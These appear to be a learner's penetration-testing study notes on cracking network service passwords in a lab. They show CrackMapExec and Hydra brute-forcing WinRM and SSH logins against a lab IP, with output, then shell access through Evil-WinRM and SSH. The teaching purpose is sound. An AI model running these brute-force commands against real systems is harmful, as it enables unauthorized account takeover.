
## Network Services  

- During Pent testing every computer network that will be encountered will have their own services installed 
- Each of these services have their own specific permission and have each assigned user
- however not all services are limited to these 




|   |   |   |
|---|---|---|
|FTP|SMB|NFS|
|IMAP/POP3|SSH|MySQL/MSSQL|
|RDP|WinRM|VNC|
|Telnet|SMTP|LDAP|


- In order to manage a Windows over a netwokr we need to use a service that allows us to use the system and execute commands or access its contents on a GUI in this case using [RDP WinRM or SSH ]
- Of course all these services require passwords thats why we need to know how to crack them 

### WinRM
-   [Windows Remote Management ](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) is teh Microsoft implementation of the netwokr protocol[ WS-Management]() 
-  It is  network protoccol based on XML web services using [SOAP]() for remote management of windows systems
- It takes care of services like [WBEM] anbd [WMI] and the [DCOM]
- For security reasons, WinRM must be activated and configured manually in windows 10 which of course depends on the envirement security WinRM uses ports on TCP 5985 and 5986
-  A handy Tool we can use for our password crakcing is [crackmapexec]() which can alos be used for other protocols such as SMB, LDAP, MSSQL and others. 

### Installing CrackMapExec
-  Installign Nmap can be done via a parrot host or a cloen directly from [GItHub]()
```shell-session
00818@htb[/htb]$ sudo apt-get -y install crackmapexec
```

### CrackMapExec Menu options 
- Running crack map with the -h flag allows us to identify the usage instructions and some options available to us
- for example 
```shell-session
00818@htb[/htb]$  crackmapexec -h
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT]
                    [--jitter INTERVAL] [--darrell]
                    [--verbose]
                    {mssql,smb,ssh,winrm} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 5.0.2dev
                                                     Codename: P3l1as

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {mssql,smb,ssh,winrm}
    mssql               own stuff using MSSQL
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
```

### Crack map Specific help 
-  Using Crack map we can specify a specific protocol and recieve more detailed help. 
- So far it only supports remote authentication ussing MSSQL, SMB, SSH, and WinRM
- Example

```shell-session
00818@htb[/htb]$ crackmapexec smb -h

usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]]
                        [-k] [--aesKey] [--kdcHost] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT]
                        [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}]
                        [--server-host HOST] [--server-port PORT] [-H HASH [HASH ...]] [--no-bruteforce]
                        [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE] [--gen-relay-list OUTPUT_FILE]
                        [--continue-on-success] [--sam | --lsa | --ntds [{drsuapi,vss}]] [--shares] [--sessions]
                        [--disks] [--loggedon-users] [--users [USER]] [--groups [GROUP]] [--local-groups [GROUP]]
                        [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE]
                        [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                        [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]
                        [--put-file FILE FILE] [--get-file FILE FILE]
                        [--exec-method {atexec,wmiexec,smbexec,mmcexec}] [--force-ps32] [--no-output]
                        [-x COMMAND | -X PS_COMMAND] [--obfs] [--clear-obfscripts]
                        [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of
                        targets, NMap XML or .Nessus file(s)

optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)

<SNIP>
```

- The general syntax for crack map is 
```shell-session
00818@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

Used Syntax >
```shell-session
00818@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

- Pwn3d! means that we can most likely execute system commands if we log in with the brute-forced user
- Another handy tool that we can use is to communicate with the WinRM service is the Evil-WInRM service which allows us to communicate with teh WinRM service efficiently

## Evil-WinRM
- First we need to install Evil-WinRM 
```shell-session
00818@htb[/htb]$ sudo gem install evil-winrm

Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)
```

- The syntax for Evil-WinRM is 
```shell-session
00818@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```
- Example of the syntax
```shell-session
00818@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

- If the program was successful a terminal session is then initialized using the[MS-PSRP]() which simplifies the execution of commands

- we know about [[SSH]] 

## Symmetric Encryption 
- uses the same key for encryption and decryption 
- However anyone who has access to the key could also log in without credentials 

## Hashing 
- Hashing converts transmitted data into other unique values
-  SSH uses hashing to confirm the authenticity of messages which essentially uses a mathematical algorithm that only  works in one direction. 

## Hydra -SSH 
-  A tool such as Hydra can be used to brute force SSH

```shell-session
00818@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

- In order to log in to the system  via ssh protocol we can openssh client which is available by default on most Linux distributions

```shell-session
00818@htb[/htb]$ ssh user@10.129.42.197

The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>
```

## Remote desktop Protocol
- 